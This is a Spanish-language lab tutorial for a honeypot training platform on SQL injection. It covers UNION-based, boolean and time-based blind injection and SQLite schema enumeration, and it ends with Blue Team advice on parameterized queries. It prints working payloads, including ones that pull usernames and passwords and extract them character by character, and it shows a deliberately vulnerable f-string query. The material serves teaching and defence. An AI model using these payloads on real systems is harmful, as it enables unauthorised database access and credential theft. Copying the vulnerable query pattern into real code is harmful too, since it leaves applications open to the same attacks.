Labs 01–04 UNION · Blind · Enum Motor: SQLite Blue Team

1. Introducción a la Inyección SQL

La inyección SQL (SQLi) ocurre cuando la aplicación concatena entrada de usuario directamente en una consulta. Se rompe la frontera entre código (la sentencia SQL) y datos (el valor del usuario): el atacante inyecta fragmentos que el motor interpreta como lógica, no como literales.

Caso práctico — lógica del honeypot

Consulta base (vulnerable)

SELECT * FROM productos WHERE nombre = '$INPUT';

Payload de alteración de contexto

' OR '1'='1

Consulta resultante (devuelve todo el inventario)

SELECT * FROM productos WHERE nombre = '' OR '1'='1';
La condición '1'='1' es siempre verdadera: el filtro por nombre deja de limitar filas. Es el mismo patrón que verás en Labs 01–02 cuando el buscador o el login concatenan sin parámetros.

2. Metodologías de explotación (Labs 01–04)

A. UNION-based attacks

Combina el resultado de la consulta original con filas fabricadas por el atacante. El número y tipos de columnas del UNION SELECT deben coincidir con la consulta víctima.

  1. Determinar el número de columnas

    Incrementa ORDER BY N hasta provocar error, o prueba nulos: 

    ' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT NULL,NULL--
    La consulta falla hasta clavar el número exacto de columnas. Sin ese match, el UNION no ejecuta.
  2. String mapping (columnas que admiten texto)

    Sustituye cada NULL por un literal de prueba ('a') para ver qué posiciones se reflejan en la UI sin romper el motor: 

    ' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
  3. Exfiltración y concatenación

    Con pocas columnas de texto, unifica campos con el operador del DBMS (en SQLite: ||): 

    ' UNION SELECT username || ':' || password, NULL FROM usuarios--

B. Blind SQL Injection

Cuando no hay errores SQL ni datos reflejados, infieres verdad/falsedad por cambios sutiles de respuesta o por tiempo.

1. Respuestas condicionales (boolean-based)

Observa diferencias HTML/cookies (p. ej. presencia de «WELCOME BACK»). Compara afirmaciones verdaderas vs falsas: 

TrackingId: xyz' AND '1'='1
TrackingId: xyz' AND '1'='0

Extrae caracteres con fuerza bruta + subcadena (base 1): 

' AND SUBSTR((SELECT password FROM usuarios LIMIT 1),1,1)='a'--

2. Time-based

Si el HTML no cambia, fuerza un delay solo cuando la condición es verdadera (sintaxis según motor; en labs SQLite suele preferirse boolean/UNION). 

-- Ejemplo conceptual (MySQL): WAITFOR / SLEEP
' AND IF(SUBSTR(@@version,1,1)='5', SLEEP(3), 0)--

C. Enumeración de bases de datos

  1. Identificar el DBMS — errores de sintaxis o funciones de versión (sqlite_version(), @@version, version().
  2. Mapear tablas / esquema — en SQLite: sqlite_master.
  3. Extraer credenciales — columnas de interés vía UNION o blind una vez conocido el esquema. 
SELECT tbl_name FROM sqlite_master WHERE type='table';
SELECT sql FROM sqlite_master WHERE tbl_name='usuarios';

4. Perspectiva Blue Team — mitigación

El error clásico (estilo honeypot)

Los filtros por blacklist (quitar comillas, bloquear palabras clave como UNION / SELECT) fallan ante ofuscación, encoding, comentarios anidados y variantes por DBMS. Son útiles como señal WAF, no como control primario.

En FlyPaper el honeypot intenta ser explotable: el Black Team aprende el ataque; el Blue Team debe aprender a no repetir el mismo fallo en código real.

La solución definitiva: consultas parametrizadas

Separa la plantilla SQL de los valores. El motor trata la entrada como literal, nunca como sintaxis.

❌ Vulnerable (concatenación / f-string)

cursor.execute(f"SELECT * FROM usuarios WHERE id = '{user_id}'")

Código blindado (SQLite / Python)

cursor.execute("SELECT * FROM usuarios WHERE id = ?", (user_id,))
Misma idea en otros stacks: placeholders %s / named params, ORMs con bind, prepared statements JDBC. Nunca interpoles input en el string SQL.
